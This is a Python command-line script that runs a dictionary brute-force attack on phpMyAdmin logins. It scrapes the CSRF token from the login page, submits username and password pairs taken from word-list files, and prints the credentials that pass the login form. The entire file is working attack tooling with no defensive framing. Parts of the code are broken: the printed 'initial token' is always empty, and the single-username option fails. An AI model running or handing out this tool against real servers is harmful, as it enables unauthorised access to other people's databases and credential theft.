import re, requests, warnings, argparse, sys
warnings.filterwarnings("ignore")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

parser = argparse.ArgumentParser(
                    prog = 'phpMyAdmin Brute Force',
                    description = 'A simple python script to perform dictionary attack to phpMyAdmin.',
                    epilog = 'Text at the bottom of help')

parser.add_argument('-t', '--target') 
parser.add_argument('-u', '--username')
parser.add_argument('-U', '--usernames-file')
parser.add_argument('-P', '--passwords-file')

args = parser.parse_args()

target = args.target
passwords_file = args.passwords_file

if (args.username != None): users = [args.username]
else: users_file = args.usernames_file

def brute(i, total, username, password):
    session = requests.Session()
    
    get_response = session.get(target, verify=False)
    token_match = re.search(r'<input type="hidden" name="token" value="(.*?)"', get_response.text)
    token = token_match.group(1) if token_match else ""

    params = {
        'pma_username': username,
        'pma_password': password,
        'server': '1',
        'target': 'index.php',
        'token': token
    }
    response = session.post(target, data=params, verify=False)

    # If loginform isn't in the response we have moved past the login page
    if re.search("loginform", response.text):
        pass 
    else:
        print(bcolors.OKGREEN + f"[{i}/{total}] Found: {username} | {password} (Token: {token})" + bcolors.ENDC)

def main():
    token = brute(0,0,"test","test")
    print(bcolors.WARNING + f"[*] Got initial token: {token}" + bcolors.ENDC)

    if (args.username == None): 
        with open(users_file) as file: users = [line.rstrip() for line in file]
    with open(passwords_file) as file: passwords = [line.rstrip() for line in file]

    total_combos = len(users) * len(passwords)

    print(bcolors.WARNING + f"[*] Total combinations: {total_combos}" + bcolors.ENDC)
    print(bcolors.WARNING + "[*] Starting :-)" + bcolors.ENDC)

    i=0

    for user in users:
        for password in passwords:
            i+=1
            token = brute(i, total_combos, user, password)

if __name__ == '__main__':
    sys.exit(main())
